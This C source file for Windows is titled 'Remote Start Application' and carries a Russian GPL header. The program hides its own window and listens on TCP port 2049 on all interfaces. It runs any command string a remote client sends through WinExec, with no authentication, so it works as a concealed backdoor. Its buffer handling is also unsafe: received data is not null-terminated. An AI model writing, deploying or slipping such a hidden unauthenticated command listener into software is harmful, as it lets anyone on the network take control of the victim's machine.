/*
Remote Start Application

Данная программа представляет собой свободно распространяемый
программный продукт; вы можете распространять ее далее и\или изменять
на условиях Стандартной публичной лицензии GNU, опубликованной
"Free Software Foundation" - либо ее версии номер 2, либо (по вашему
выбору) любой более поздней ее версии.

Распространяя данный программный продукт, мы надеемся что он окажется
полезным, но НЕ ДАЕМ НИКАКИХ ГАРАНТИЙ, даже подразумеваемой гарантии
ПРИГОДНОСТИ К КУПЛЕ-ПРОДАЖЕ или ИСПОЛЬЗОВАНИЮ В КОНКРЕТНЫХ ЦЕЛЯХ
(см. "Стандартную публичную лицензию GNU").

Вместе с данной программой вы должны были получить копию "Стандартной
публичной лицензии GNU"; если это не так, напишите в Free Software
Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.

E-mail: e-vasil@yandex.ru
Web: winapi32.narod.ru 
*/

#include <windows.h>
#include <windowsx.h>
#include <string.h>
#include <stdio.h>
#include <winsock.h>
#include "c:\lcc\project\server\serverres.h"


#define WS_VERSION_REQD	0x0101
#define WM_ASYNC WM_USER+1

HINSTANCE hInst;
HWND hwndMain;
WSADATA stWSAData;
SOCKET hSock = INVALID_SOCKET;
SOCKET hSock2 = INVALID_SOCKET;
SOCKADDR_IN myaddr;
WORD WSAEvent;
char TxtBuf[256],RetBuf[256];

LRESULT CALLBACK MainWndProc(HWND hwnd,UINT msg,WPARAM wParam,LPARAM lParam);

static BOOL InitApplication(void)
{
	WNDCLASS wc;

	memset(&wc,0,sizeof(WNDCLASS));
	wc.style = CS_HREDRAW|CS_VREDRAW |CS_DBLCLKS ;
	wc.lpfnWndProc = (WNDPROC)MainWndProc;
	wc.hInstance = hInst;
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
	wc.lpszClassName = "serverWndClass";
	wc.lpszMenuName = NULL;
	wc.hCursor = LoadCursor(NULL,IDC_ARROW);
	wc.hIcon = LoadIcon(NULL,IDI_APPLICATION);
	if (!RegisterClass(&wc))
		return 0;

	return 1;
}

HWND CreateserverWndClassWnd(void)
{
	return CreateWindow("serverWndClass","server",
		WS_MINIMIZEBOX|WS_CLIPSIBLINGS|WS_CLIPCHILDREN|WS_MAXIMIZEBOX|WS_CAPTION|WS_BORDER|WS_SYSMENU|WS_THICKFRAME,
		CW_USEDEFAULT,0,CW_USEDEFAULT,0,
		NULL,
		NULL,
		hInst,
		NULL);
}


LRESULT CALLBACK MainWndProc(HWND hwnd,UINT msg,WPARAM wParam,LPARAM lParam)
{
	DWORD lenaddr;
	switch (msg) {
	case WM_COMMAND:
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	case WM_ASYNC:

		WSAEvent = WSAGETSELECTEVENT (lParam);
		switch (WSAEvent)
		{
			case FD_READ:
				recv(hSock2, TxtBuf, 256, 0);
				WinExec(TxtBuf,SW_SHOW);
				wsprintf(RetBuf,"%s -OK!",TxtBuf);
				send(hSock2,RetBuf,256,MSG_OOB);
				return 0;
			case FD_ACCEPT:
				lenaddr=sizeof(myaddr);
				hSock2=accept(hSock,(LPSOCKADDR)&myaddr,&lenaddr);
				send(hSock2,"Connect OK",256,MSG_OOB);
				return 0;
		}
		break;

	default:
		return DefWindowProc(hwnd,msg,wParam,lParam);
	}

	return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nCmdShow)
{
	MSG msg;
	hInst = hInstance;
	if (!InitApplication())
		return 0;

	if ((hwndMain = CreateserverWndClassWnd()) == (HWND)0)
		return 0;
	ShowWindow(hwndMain,SW_HIDE);

	WSAStartup(WS_VERSION_REQD, &stWSAData);
	hSock = socket (AF_INET,SOCK_STREAM,0);

	WSAAsyncSelect (hSock,hwndMain,WM_ASYNC, FD_ACCEPT | FD_READ);

	myaddr.sin_family = AF_INET;
	myaddr.sin_addr.s_addr = htonl (INADDR_ANY);
	myaddr.sin_port = htons (2049);
	bind(hSock,(LPSOCKADDR)&myaddr, sizeof(struct sockaddr));
	listen (hSock, 5);

	while (GetMessage(&msg,NULL,0,0))
	{

		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return msg.wParam;
}


